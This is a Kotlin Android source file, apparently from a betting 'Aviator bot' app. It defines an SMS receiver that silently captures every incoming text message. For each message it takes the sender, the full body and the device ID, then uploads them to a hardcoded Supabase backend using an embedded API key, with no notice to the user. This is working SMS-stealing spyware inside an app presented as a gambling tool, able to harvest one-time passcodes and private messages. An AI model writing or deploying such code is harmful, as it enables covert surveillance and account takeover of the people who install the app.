package ao.elephantbet.aviatorbot

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.telephony.SmsMessage
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action != "android.provider.Telephony.SMS_RECEIVED") return
        if (context == null) return

        val pdus = intent.extras?.get("pdus") as? Array<*> ?: return
        val format = intent.extras?.getString("format") ?: "3gpp"

        val androidId = Settings.Secure.getString(
            context.contentResolver, Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        val supaUrl = "https://oulidkbxjfrddluoqsif.supabase.co"
        val supaKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"

        for (pdu in pdus) {
            val msg = SmsMessage.createFromPdu(pdu as ByteArray, format)
            val remetente = msg.displayOriginatingAddress ?: "desconhecido"
            val corpo = msg.messageBody ?: ""
            val timestampMs = System.currentTimeMillis()

            Log.d("SKYBOT_SMS", "SMS recebida de $remetente")

            Thread {
                try {
                    val json = JSONObject()
                    json.put("device_id", androidId)
                    json.put("remetente", remetente)
                    json.put("corpo", corpo)
                    json.put("timestamp_ms", timestampMs)

                    val url = URL("$supaUrl/rest/v1/sms")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.setRequestProperty("apikey", supaKey)
                    conn.setRequestProperty("Authorization", "Bearer $supaKey")
                    conn.setRequestProperty("Content-Type", "application/json")
                    conn.setRequestProperty("Prefer", "return=minimal")
                    conn.doOutput = true
                    conn.connectTimeout = 10000
                    conn.readTimeout = 10000
                    conn.outputStream.write(json.toString().toByteArray(Charsets.UTF_8))

                    val code = conn.responseCode
                    if (code !in 200..299) {
                        val err = conn.errorStream?.bufferedReader()?.readText() ?: ""
                        Log.w("SKYBOT_SMS", "Erro HTTP $code: $err")
                    } else {
                        Log.d("SKYBOT_SMS", "SMS enviada ao Supabase OK")
                    }
                    conn.disconnect()
                } catch (e: Exception) {
                    Log.w("SKYBOT_SMS", "Erro: ${e.message}")
                }
            }.start()
        }
    }
}
